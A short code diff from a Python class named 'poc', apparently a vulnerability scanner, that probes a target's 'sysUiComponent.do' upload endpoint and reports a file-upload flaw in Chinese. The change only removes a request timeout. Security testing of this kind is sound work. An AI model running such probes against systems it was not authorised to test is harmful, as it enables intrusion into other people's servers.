@@ -50,7 +50,7 @@ class poc:
         }
         self.headers["Referer"] = "{}://{}/sys/ui/sys_ui_component/sysUiComponent.do?method=upload".format(scheme, netloc)
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, allow_redirects=False, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, files=data, headers=self.headers, allow_redirects=False, verify=False, proxies=self.proxies)
             if result.status_code == 200 and "directoryPath" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在文件上传漏洞\033[0m
